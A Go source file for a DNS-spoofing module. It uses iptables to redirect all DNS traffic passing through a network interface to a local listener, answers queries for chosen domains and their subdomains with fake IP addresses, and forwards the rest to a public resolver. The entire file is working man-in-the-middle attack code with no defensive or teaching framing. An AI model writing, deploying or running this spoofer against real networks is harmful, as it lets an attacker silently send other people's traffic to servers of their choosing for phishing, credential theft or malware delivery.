package dnsspoof

import (
	"log"
	"net"
	"os/exec"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

const listenPort = "15353"

type Spoofer struct {
	iface  string
	rules  map[string]string // domain → fake IP
	mu     sync.RWMutex
	active int32
	stop   chan struct{}
}

func New(ifaceName string) *Spoofer {
	return &Spoofer{iface: ifaceName, rules: make(map[string]string)}
}

func (s *Spoofer) Active() bool { return atomic.LoadInt32(&s.active) == 1 }

func (s *Spoofer) AddRule(domain, ip string) {
	s.mu.Lock()
	s.rules[strings.ToLower(domain)] = ip
	s.mu.Unlock()
}

func (s *Spoofer) RemoveRule(domain string) {
	s.mu.Lock()
	delete(s.rules, strings.ToLower(domain))
	s.mu.Unlock()
}

func (s *Spoofer) Rules() map[string]string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make(map[string]string, len(s.rules))
	for k, v := range s.rules {
		out[k] = v
	}
	return out
}

func (s *Spoofer) Start() error {
	if !atomic.CompareAndSwapInt32(&s.active, 0, 1) {
		return nil
	}
	// Redirect all DNS traffic through this machine to our listener
	exec.Command("iptables", "-t", "nat", "-A", "PREROUTING",
		"-i", s.iface, "-p", "udp", "--dport", "53",
		"-j", "REDIRECT", "--to-port", listenPort).Run()
	s.stop = make(chan struct{})
	go s.listen()
	log.Printf("DNSSpoof: started on port %s (iface %s)", listenPort, s.iface)
	return nil
}

func (s *Spoofer) Stop() {
	if !atomic.CompareAndSwapInt32(&s.active, 1, 0) {
		return
	}
	exec.Command("iptables", "-t", "nat", "-D", "PREROUTING",
		"-i", s.iface, "-p", "udp", "--dport", "53",
		"-j", "REDIRECT", "--to-port", listenPort).Run()
	close(s.stop)
	log.Println("DNSSpoof: stopped")
}

func (s *Spoofer) listen() {
	pc, err := net.ListenPacket("udp4", ":"+listenPort)
	if err != nil {
		log.Printf("DNSSpoof: listen: %v", err)
		return
	}
	defer pc.Close()
	buf := make([]byte, 4096)
	for {
		select {
		case <-s.stop:
			return
		default:
		}
		pc.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			continue
		}
		data := make([]byte, n)
		copy(data, buf[:n])
		go s.handleQuery(pc, addr, data)
	}
}

func (s *Spoofer) handleQuery(pc net.PacketConn, addr net.Addr, data []byte) {
	var msg dns.Msg
	if err := msg.Unpack(data); err != nil {
		return
	}
	if len(msg.Question) == 0 {
		return
	}

	q := msg.Question[0]
	domain := strings.TrimSuffix(strings.ToLower(q.Name), ".")

	s.mu.RLock()
	fakeIP, ok := s.rules[domain]
	if !ok {
		parts := strings.SplitN(domain, ".", 2)
		if len(parts) == 2 {
			fakeIP, ok = s.rules[parts[1]]
		}
	}
	s.mu.RUnlock()

	if ok && q.Qtype == dns.TypeA {
		resp := new(dns.Msg)
		resp.SetReply(&msg)
		resp.RecursionAvailable = true
		if rr, err := dns.NewRR(q.Name + " 60 IN A " + fakeIP); err == nil {
			resp.Answer = []dns.RR{rr}
		}
		if b, err := resp.Pack(); err == nil {
			pc.WriteTo(b, addr)
		}
		return
	}

	// Forward to real DNS server
	conn, err := net.DialTimeout("udp", "8.8.8.8:53", 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(3 * time.Second))
	if _, err := conn.Write(data); err != nil {
		return
	}
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		return
	}
	pc.WriteTo(resp[:n], addr)
}
